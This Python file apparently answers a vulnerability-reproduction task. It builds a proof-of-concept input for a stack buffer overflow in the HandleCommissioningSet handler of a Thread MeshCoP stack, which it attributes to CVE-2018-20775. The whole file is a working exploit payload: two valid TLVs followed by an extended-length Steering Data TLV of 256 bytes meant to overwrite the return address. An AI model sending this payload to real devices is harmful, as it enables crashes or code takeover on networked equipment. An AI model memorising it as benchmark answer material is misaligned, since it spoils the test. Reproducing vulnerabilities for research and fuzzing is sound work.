import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability in HandleCommissioningSet.
        The vulnerability is a stack buffer overflow caused by improper handling of 
        Commissioner Dataset TLVs with extended lengths (CVE-2018-20775).
        """
        
        # MeshCoP TLV Type Constants
        TLV_STEERING_DATA = 8
        TLV_BORDER_AGENT_LOCATOR = 9
        TLV_COMMISSIONER_SESSION_ID = 11

        # Helper to create a valid standard TLV (1 byte Type, 1 byte Length, Value)
        # Used for context TLVs to ensure the parser reaches the vulnerable code
        def create_valid_tlv(type_id, value_bytes):
            return struct.pack("BB", type_id, len(value_bytes)) + value_bytes

        # Helper to create a malicious Extended TLV
        # Format: Type (1B) | Length=0xFF (1B) | ExtendedLength (2B Big Endian) | Value
        def create_malicious_tlv(type_id, length):
            # 0xFF indicates extended length follows in 2 bytes
            header = struct.pack(">BBH", type_id, 0xFF, length)
            body = b'A' * length
            return header + body

        poc_data = b""

        # 1. Add a valid Commissioner Session ID (Type 11)
        # This is typically required for the dataset to be processed.
        # Value is 2 bytes (uint16), e.g., 0x0001
        poc_data += create_valid_tlv(TLV_COMMISSIONER_SESSION_ID, b"\x00\x01")

        # 2. Add a valid Border Agent Locator (Type 9)
        # Value is 2 bytes (uint16), e.g., 0x0000
        poc_data += create_valid_tlv(TLV_BORDER_AGENT_LOCATOR, b"\x00\x00")

        # 3. Add the malicious Steering Data TLV (Type 8)
        # The vulnerable function copies Steering Data into a fixed-size stack buffer (max 16 bytes).
        # By providing an Extended TLV with a length larger than 16, we trigger a stack overflow.
        # We use 256 bytes which is sufficient to overwrite the stack frame/return address.
        poc_data += create_malicious_tlv(TLV_STEERING_DATA, 256)

        return poc_data
